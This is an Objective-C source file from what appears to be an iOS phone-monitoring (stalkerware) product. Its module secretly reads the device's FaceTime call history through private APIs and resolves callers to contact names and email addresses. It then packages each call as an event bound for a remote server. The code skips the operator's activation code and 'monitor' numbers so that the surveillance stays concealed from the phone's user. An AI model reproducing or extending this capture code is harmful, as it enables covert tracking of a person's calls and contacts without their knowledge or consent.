//
//  FaceTimeCaptureManager.m
//  FaceTimeCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 7/22/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "FaceTimeCaptureManager-E.h"
#import "FaceTimeLog.h"
#import "HistoricalFaceTimeLog.h"

#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxVoIPEvent.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "TelephoneNumber.h"
#import "SystemUtilsImpl.h"

#import "CTCall.h"
#import "RecentCall+IOS4.h"
#import "RecentCall.h"	// MobilePhone application

#import "PHRecentCall.h"
#import "PHRecentMultiCall.h"

#include <dlfcn.h>		// Dynamically loading
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

#import "CHManager.h"
#import "CHRecentCall.h"

static void *_MobilePhoneApplicationHandle = nil;

@interface FaceTimeCaptureManager (private)
- (void) sendFaceTimeLogEvent:(FaceTimeLog *) aFaceTimeLog withCallDate:(NSDate *)aCallDate;
- (double) getByteOfDataUsed: (CTCall *) aCall;
- (void) loadPhoneApplication;
- (void) unloadPhoneApplication;
@end



@implementation FaceTimeCaptureManager

@synthesize mAC;
@synthesize mNotCaptureNumbers;
@synthesize mCallHistoryMaxRowID;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the FaceTimeCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
 */
- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
        
		if ([[SystemUtilsImpl deviceIOSMainVersion] intValue] > 5 &&
            [[SystemUtilsImpl deviceIOSMainVersion] intValue] < 9) { // 5 < iOS < 9
            // iOS 9, MobilePhone cannot start up: Unable to obtain a task name port right for pid (os/kern) failure (5)
			DLog (@"iOS verison is greater than 5, so load MobilePhone application")
			[self loadPhoneApplication];		
		}
	}
	return self;
}

/**
 - Method name: captureCall
 - Purpose:This method is used to capture Call Logs
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) captureFacetime {
    CHManager *manager = [[CHManager alloc] init];
    NSArray *allCallLogs = (NSArray *)[manager fetchRecentCallsSyncWithCoalescing:YES];
    
    NSArray *facetimeCalls = [allCallLogs filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"callType == 8 || callType == 16"]];
    
    if (facetimeCalls.count > 0) {
        //Get last captured call log timestamp and array
        NSInteger lastCallTimeStamp = -1;
        NSArray *lastCallLogIDs = [NSArray array];
        
        NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        path = [path stringByAppendingPathComponent:@"lastFacetimeCallLogs.plist"];
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        
        if ([fileManager fileExistsAtPath:path]) {
            NSDictionary *lastCallLogDic = [NSDictionary dictionaryWithContentsOfFile:path];
            lastCallTimeStamp = [lastCallLogDic[@"lastFacetimeCallTimeStamp"] integerValue];
            lastCallLogIDs = lastCallLogDic[@"lastFacetimeCallLogIDs"];
        }
        
        NSMutableArray *captureCallLogIDArray = [NSMutableArray array];
        __block NSInteger captureCallLogTimeStamp = -1;
        
        //For first time capture the lastest call
        if (lastCallTimeStamp == -1) {
            CHRecentCall *lastestCall =  facetimeCalls[0];
            [self onFaceTimeLogCapture:lastestCall];
            [captureCallLogIDArray addObject:lastestCall.uniqueId];
            captureCallLogTimeStamp = [lastestCall.date timeIntervalSince1970];
        }
        else {//After first time we have to check all calls that newer than last timestamp
            [facetimeCalls enumerateObjectsUsingBlock:^(CHRecentCall *call, NSUInteger idx, BOOL *stop) {
                __block BOOL isCaptured = NO;
                NSString *callUniqueID = call.uniqueId;
                
                if ([call.date timeIntervalSince1970] >= lastCallTimeStamp) {
                    [lastCallLogIDs enumerateObjectsUsingBlock:^(NSString *capturedCallUniqueID, NSUInteger idx, BOOL *stop) {
                        if ([callUniqueID isEqualToString:capturedCallUniqueID]) {
                            isCaptured = YES;
                            *stop = YES;
                        }
                    }];
                    
                    if (!isCaptured) {
                        [self onFaceTimeLogCapture:call];
                        [captureCallLogIDArray addObject:callUniqueID];
                        
                        if (captureCallLogTimeStamp == -1 ){
                            captureCallLogTimeStamp = [call.date timeIntervalSince1970];
                        }
                    }
                }
            }];
        }
        
        if (captureCallLogTimeStamp > -1 && captureCallLogIDArray.count > 0) {
            NSDictionary *lastCallLogDic = @{@"lastFacetimeCallTimeStamp": [NSNumber numberWithInteger:captureCallLogTimeStamp],
                                             @"lastFacetimeCallLogIDs" : captureCallLogIDArray};
            
            NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
            path = [path stringByAppendingPathComponent:@"lastFacetimeCallLogs.plist"];
            
            [lastCallLogDic writeToFile:path atomically:YES];
        }

    }
    
    [manager release];
    manager = nil;
}

/**
 - Method name: onFaceTimeLogCapture
 - Purpose:This method is invoked only when FaceTime is ended
 - Argument list and description: aNotification (id)
 - Return description: No return type
 */
- (void) onFaceTimeLogCapture:(CHRecentCall *) aCall {
	DLog (@"======= facetime capture =======")
		
    if (aCall) {
        NSInteger callType = aCall.callType;
        
        if((callType == 8 || callType == 16)) {// Type 8 is a facetime video call, Type 16 is a facetime audio call
            
            NSString * faceTimeID = nil;
            faceTimeID = aCall.callerId;
            
            FaceTimeLog *faceTimeLog = [[FaceTimeLog alloc] init];
            
            faceTimeLog.mContactNumber = aCall.callerId;
            faceTimeLog.mDuration = aCall.duration;
            faceTimeLog.mBytesOfDataUsed = [aCall.bytesOfDataUsed doubleValue];
            faceTimeLog.mContactID = -1;
            
            //Incoming Call
            if (aCall.callStatus == 1) {
                faceTimeLog.mCallState = kEventDirectionIn;
            }//Outgoing Call
            else if (aCall.callStatus == 2 || aCall.callStatus == 16) {
                faceTimeLog.mCallState = kEventDirectionOut;
            }//Missed Call
            else if (aCall.callStatus == 8) {
                faceTimeLog.mCallState = kEventDirectionMissedCall;
            }
            else {
                faceTimeLog.mCallState = kEventDirectionUnknown;
            }
            
            NSArray *faceTimeLogs = [NSArray arrayWithObjects:faceTimeLog, nil];
            
            // Private number is show as 'Blocked' but its number is null
            DLog (@"Matching: faceTimeID = %@,  [faceTimeLog mContactNumber] = %@, mNotCaptureNumbers = %@, direction: %d",
                  faceTimeID,
                  [faceTimeLog mContactNumber],
                  [self mNotCaptureNumbers],
                  [faceTimeLog mCallState]);
            DLog (@"faceTimeLog = %@, faceTimeLogs = %@", faceTimeLog, faceTimeLogs);
            
            BOOL isNotCaptureNumber				= FALSE;
            
            // -- check Monitor FaceTime ID only when it's NOT outgoing call
            if ([faceTimeLog mCallState] != kEventDirectionOut) {
                
                TelephoneNumber *telNumberCompare = [[[TelephoneNumber alloc] init] autorelease];
                for (NSString *ignoredFaceTimeID in [self mNotCaptureNumbers]) {
                    isNotCaptureNumber = [telNumberCompare isNumber:faceTimeID matchWithMonitorNumber:ignoredFaceTimeID];
                    if (isNotCaptureNumber) {
                        break;
                    } else { // Check email address
                        NSRange locationOfAt = [faceTimeID rangeOfString:@"@"];
                        if (locationOfAt.location != NSNotFound) {
                            NSString *lowerFaceTimeID = [faceTimeID lowercaseString];
                            NSString *lowerIgnoredFaceTimeID = [ignoredFaceTimeID lowercaseString];
                            isNotCaptureNumber = [lowerFaceTimeID isEqualToString:lowerIgnoredFaceTimeID];
                            if (isNotCaptureNumber) {
                                break;
                            }
                        }
                    }
                }
                // -- check *#900900900 when it is outgoing call
            }
            /*else if ([callLog mCallState] == kEventDirectionOut) {
             if ([telNumber isEqualToString:_FULLDEFAULTACTIVATIONCODE_]) {
             isNotCaptureNumber = YES;
             }
             }
             */
            
            /*
             1. Private number ==> Capture
             2. Activation code number ==> Not capture
             3. Voice mail number ==> Not capture
             4. Number in self.mNotCaptureNumbers ==> Not capture
             5. Incoming call of monitor number ==> Not capture
             6. *#900900900 ==> Not capture
             */
            
            if([faceTimeLogs count]						&&		// FaceTime Log entry exists
               ![faceTimeID isEqualToString:[self mAC]]	&&		// Not activation code
               !isNotCaptureNumber						) {
                
                DLog (@"@@@@@@@@@@ Capture FaceTime Log @@@@@@@@@@")
                
                if ([faceTimeID length] == 0) {
                    // Private number
                    DLog (@">> Send FaceTime event to server as private number, faceTimeLog = %@", faceTimeID);
                    [faceTimeLog setMContactNumber:@"Blocked"];
                    [self sendFaceTimeLogEvent:faceTimeLog withCallDate:aCall.date];
                } else {
                    // Number that is not voice mail number, not activation code number, not in self.mNotCaptureNumbers
                    DLog (@">> Send FaceTime event to server as normal number, telNumber = %@", faceTimeID);
                    [self sendFaceTimeLogEvent:faceTimeLog withCallDate:aCall.date];
                }
            }
            
            [faceTimeLog release];
            faceTimeLog = nil;
        }
    }
}

/**
 - Method name: sendFaceTimeLogEvent
 - Purpose:This method is  used to send FaceTime Log Event
 - Argument list and description: aFaceTimeLog (FaceTimeLog)
 - Return description: No return type
 */

- (void) sendFaceTimeLogEvent:(FaceTimeLog *) aFaceTimeLog withCallDate:(NSDate *)aCallDate {
	ABContactsManager *contactManager = [[ABContactsManager alloc]init];
	//DLog (@"Contact Name:--->%@",[contactManager searchContactName:[aCallLog mContactNumber]]);
//	DLog (@"Contact Name:--->%@",	[contactManager searchFirstNameLastName:[aFaceTimeLog mContactNumber]]);
//  DLog (@"Contact Name:--->%@",	[contactManager searchFirstNameLastName:[aFaceTimeLog mContactNumber] contactID:[aFaceTimeLog mContactID]]);
//	DLog (@"Contact Number:--->%@",	[contactManager formatSenderNumber:[aFaceTimeLog mContactNumber]]);
	DLog (@"Duration:---->%lu",		(unsigned long)[aFaceTimeLog mDuration]);
	DLog (@"Event Direction---->%d",[aFaceTimeLog mCallState]);
	DLog (@"Byte transfered---->%f",[aFaceTimeLog mBytesOfDataUsed]);
	
	//===========================================Create FxVolIPEvent Event===============================================================
	FxVoIPEvent *faceTimeEvent		= [[FxVoIPEvent alloc] init];
	NSString *formatNumber		= [aFaceTimeLog mContactNumber];
	NSString *contactName		= @"";
	NSString *userID			= @"";
	if ([formatNumber length] > 1) {
		//contactName=[contactManager searchContactName:formatNumber];
		NSRange locationOfAt = [formatNumber rangeOfString:@"@"];
		// Case 1: FaceTime ID is telephone number
		if (locationOfAt.location == NSNotFound) {
            DLog(@"Case 1: FaceTime ID is telephone number");
			//contactName = [contactManager searchFirstNameLastName:formatNumber];
            
            contactName = [contactManager searchFirstNameLastName:formatNumber contactID:[aFaceTimeLog mContactID]];
			userID		= [contactManager formatSenderNumber:[aFaceTimeLog mContactNumber]];
		} 
		// Case 2: FaceTime ID is email address
		else {
            DLog(@"Case 2: FaceTime ID is email address");
			/*
				contactName = [contactManager searchFirstLastNameWithEmail:formatNumber];
				ISSUE:
				This cause the issue of wrong contact name like "Som Som" in the case that 
				-  have more than identical email in the same contact
				-  more than one contact with the identical email							 
			 */
			//contactName = [contactManager searchDistinctFirstLastNameWithEmail:formatNumber];
            contactName = [contactManager searchDistinctFirstLastNameWithEmailV2:formatNumber];
            
			userID		= [aFaceTimeLog mContactNumber];
		}
	}
	[faceTimeEvent setMContactName:contactName];
	[faceTimeEvent setMUserID:userID];
	[faceTimeEvent setDateTime:[DateTimeFormat phoenixDateTime:aCallDate]];
	[faceTimeEvent setMDuration:[aFaceTimeLog mDuration]];
	[faceTimeEvent setMDirection:[aFaceTimeLog mCallState]];
	[faceTimeEvent setEventType:kEventTypeVoIP];
	[faceTimeEvent setMTransferedByte:[aFaceTimeLog mBytesOfDataUsed]];
	[faceTimeEvent setMCategory:kVoIPCategoryFaceTime];
	[faceTimeEvent setMFrameStripID:0];
	[faceTimeEvent setMVoIPMonitor:kFxVoIPMonitorNO];
	
	DLog (@"**Contact Name:--->%@",	[faceTimeEvent mContactName]);
	DLog (@"**Contact Number:--->%@",	[faceTimeEvent mUserID]);
	DLog (@"**Duration:---->%lu",		(unsigned long)[faceTimeEvent mDuration]);
	DLog (@"**Event Direction---->%d",[faceTimeEvent mDirection]);
	DLog (@"**Byte transfered---->%lu",(unsigned long)[faceTimeEvent mTransferedByte]);

	
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		DLog (@"&&&&&&&&&&&&& Sending FaceTime Log Event &&&&&&&&&&&&&&")
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:faceTimeEvent withObject:self];
	}
//	//====================================================== Print Result ==================================================================
//	NSString *resultString=[NSString stringWithFormat:@"...\nContact Name:%@,ContactNumber:%@,Duraction:%d,Direction:%d,DateTime:%@....\n",
//							 contactName,[aCallLog mContactNumber],[aCallLog mDuration],
//							 [aCallLog mCallState],[DateTimeFormat phoenixDateTime]];
//	FxLog("", "", 1, kFxLogLevelDebug,resultString);
//	//======================================================================================================================================
	[contactManager release];
	contactManager=nil;
	[faceTimeEvent release];
	faceTimeEvent=nil;
}


- (double) getByteOfDataUsed: (CTCall *) aCall {
	
	DLog (@"before RecentCall")
	// -- Get Byte of Data used for the recent call
	Class $RecentCall			= objc_getClass("RecentCall");			
	DLog (@"class $RecentCall %@", $RecentCall)
	
	Class $PHRecentCall			= objc_getClass("PHRecentCall");			
	DLog (@"class $PHRecentCall %@", $PHRecentCall)
	
	double byteOfDataUsed = 0.0;
	/*
	 Note that for iOS 5, it has class RecentCall, but this class doesn't have the property bytesOfDataUsed.
	 iOS 5 doesn't shown byte in the recent UI of MobilePhone application. Also call database doesn't keep
	 this value.
	 */
	if ($RecentCall) {
		RecentCall *recentCall		= [[$RecentCall alloc] initWithCTCall: aCall];
		DLog (@"recentCall ---> %@", recentCall)		
		if (recentCall													&&
			[recentCall respondsToSelector:@selector(bytesOfDataUsed)]	){
			byteOfDataUsed			= [recentCall bytesOfDataUsed];			
			DLog (@"bytesOfDataUsed ---> %f", byteOfDataUsed)
		}									   
		[recentCall release];
		recentCall = nil;						
	} else if ($PHRecentCall) {
		PHRecentCall *recentCall = [[$PHRecentCall alloc] initWithCTCall:aCall];
		if (recentCall													&&
			[recentCall respondsToSelector:@selector(bytesOfDataUsed)]	){
			byteOfDataUsed			= [recentCall bytesOfDataUsed];			
			DLog (@"recentCall ---> %@", recentCall)
			DLog (@"isoCountryCode ---> %@", [recentCall isoCountryCode])
			DLog (@"mobileNetworkCode ---> %@", [recentCall mobileNetworkCode])
			DLog (@"mobileCountryCode ---> %@", [recentCall mobileCountryCode])
			DLog (@"_CNAPFirstName ---> %@", [recentCall _CNAPFirstName])
			DLog (@"_CNAPSecondNames ---> %@", [recentCall _CNAPSecondNames])
			DLog (@"callerDisplayName ---> %@", [recentCall callerDisplayName])
			DLog (@"underlyingCTCalls ---> %@", [recentCall underlyingCTCalls])
			DLog (@"bytesOfDataUsed ---> %f", byteOfDataUsed)
		}									   
		[recentCall release];
		recentCall = nil;
	}
	return byteOfDataUsed;
}

- (void) loadPhoneApplication {
	/**************************************************
	 Dynamically LOAD MobilePhone Application			 
	 **************************************************/						
	if (_MobilePhoneApplicationHandle == NULL) {
		DLog (@">>>>>>>>>>>>>>>>>>>>> Dynamically Load MobilePhone application >>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		_MobilePhoneApplicationHandle = dlopen("/Applications/MobilePhone.app/MobilePhone", RTLD_NOW);
        DLog(@">>>>>>>>>>>>>>>>>>>>> Dynamically Load MobilePhone application error, %s >>>>>>>>>>>>>>>>>>>>>>>>>>>>>", dlerror());
	}
}

- (void) unloadPhoneApplication {
	/**************************************************
	 Dynamically CLOSE MobilePhone Application			 
	 **************************************************/
	DLog (@"Dynamically Unload MobilePhone application")
	if (_MobilePhoneApplicationHandle != NULL) {
        int error = 0;
		error = dlclose(_MobilePhoneApplicationHandle);
		_MobilePhoneApplicationHandle = NULL;
        DLog(@">>>>>>>>>>>>>>>>>>>>> Dynamically Unload MobilePhone application last error, %d >>>>>>>>>>>>>>>>>>>>>>>>>>>>>", error);
	}
}


#pragma mark - Historical Facetime VoIP

+ (NSArray *) toFxEvent: (NSArray *) aFaceTimeLogs {
    ABContactsManager *contactManager   = [[ABContactsManager alloc]init];
    NSMutableArray *fxeventEventArray   = [NSMutableArray array];
    
    for (CHRecentCall *faceTimeLog in aFaceTimeLogs) {
        
        FxVoIPEvent *faceTimeEvent      = [[FxVoIPEvent alloc] init];
        
        NSString *formatNumber          = [faceTimeLog callerId];
        NSString *contactName           = @"";
        NSString *userID                = @"";
        
        if ([formatNumber length] > 1) {

            NSRange locationOfAt        = [formatNumber rangeOfString:@"@"];
            
            // Case 1: FaceTime ID is telephone number
            if (locationOfAt.location == NSNotFound) {
                contactName = [contactManager searchFirstNameLastName:formatNumber contactID:-1];
                userID		= [contactManager formatSenderNumber:[faceTimeLog callerId]];
            }
            // Case 2: FaceTime ID is email address
            else {
                /*
                 contactName = [contactManager searchFirstLastNameWithEmail:formatNumber];
                 ISSUE:
                 This cause the issue of wrong contact name like "Som Som" in the case that
                 -  have more than identical email in the same contact
                 -  more than one contact with the identical email
                 */
                //contactName = [contactManager searchDistinctFirstLastNameWithEmail:formatNumber];
                contactName = [contactManager searchDistinctFirstLastNameWithEmailV2:formatNumber];
                
                userID		= [faceTimeLog callerId];
            }
        }
        
        [faceTimeEvent setMContactName:contactName];
        [faceTimeEvent setMUserID:userID];
        
        // Set datetime according to the time in Call Database
        if ([faceTimeLog date]) {
            [faceTimeEvent setDateTime:[DateTimeFormat dateTimeWithDate:[faceTimeLog date]]];
        } else {
            [faceTimeEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        }
        
        [faceTimeEvent setMDuration:[faceTimeLog duration]];
        
        //Incoming Call
        if (faceTimeLog.callStatus == 1) {
            faceTimeEvent.mDirection = kEventDirectionIn;
        }//Outgoing Call
        else if (faceTimeLog.callStatus == 2 || faceTimeLog.callStatus == 16) {
            faceTimeEvent.mDirection = kEventDirectionOut;
        }//Missed Call
        else if (faceTimeLog.callStatus == 8) {
            faceTimeEvent.mDirection = kEventDirectionMissedCall;
        }
        else {
            faceTimeEvent.mDirection = kEventDirectionUnknown;
        }
        
        [faceTimeEvent setEventType:kEventTypeVoIP];
        [faceTimeEvent setMTransferedByte:[[faceTimeLog bytesOfDataUsed] doubleValue]];
        [faceTimeEvent setMCategory:kVoIPCategoryFaceTime];
        [faceTimeEvent setMFrameStripID:0];
        [faceTimeEvent setMVoIPMonitor:kFxVoIPMonitorNO];
        
        [fxeventEventArray addObject:faceTimeEvent];
        
        [faceTimeEvent release];
        faceTimeEvent                   = nil;
    }
    
    [contactManager release];
    contactManager                  = nil;
    return fxeventEventArray;
}

+ (NSArray *) allFaceTimeVoIPs {
    CHManager *manager = [[CHManager alloc] init];
    
    NSArray *allCallLogs = (NSArray *)[manager fetchRecentCallsSyncWithCoalescing:YES];
    
    [manager release];
    manager = nil;
    
    NSArray *faceTimeLogs = [allCallLogs filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"callType == 8 || callType == 16"]];
    [allCallLogs release];
    allCallLogs = nil;
    
    NSArray *fxFacetimeLogs = [self toFxEvent:faceTimeLogs];
    [faceTimeLogs release];
    faceTimeLogs = nil;
    
    return fxFacetimeLogs;
}

+ (NSArray *) allFaceTimeVoIPsWithMax: (NSInteger) aMaxNumber {
    CHManager *manager = [[CHManager alloc] init];
    NSArray *allCallLogs = (NSArray *)[manager fetchRecentCallsSyncWithCoalescing:YES];
    [manager release];
    manager = nil;
    
    NSArray *faceTimeLogs = [allCallLogs filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"callType == 8 || callType == 16"]];
    
    if (aMaxNumber > faceTimeLogs.count) {
        aMaxNumber = faceTimeLogs.count;
    }
    
    NSArray *fxFacetimeLogs = [self toFxEvent:[faceTimeLogs subarrayWithRange:NSMakeRange(0, aMaxNumber)]];
    
    return fxFacetimeLogs;
}

#pragma mark - Clear Util

+ (void)clearCapturedData
{
    // Remove last capture time stemp for each event
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    
    //Call log
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastFacetimeCallLogs.plist"] error:&error]) {
        DLog(@"Remove last facetime call logs plist error with %@", [error localizedDescription]);
    }
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */
- (void) dealloc {
    // It's ok to unload 'Phone' application for iOS 6, but iOS 7 causes the application crash thus we decide to not unload it
//	if ([[SystemUtilsImpl deviceIOSMainVersion] intValue] > 5) {
//		DLog (@"iOS version is greater than 5, so we should unload MobilePhone application when this class is dealloc")
//		[self unloadPhoneApplication];
//	}
    
	[mAC release];
	
	[mNotCaptureNumbers release];
    
	[super dealloc];
}


@end
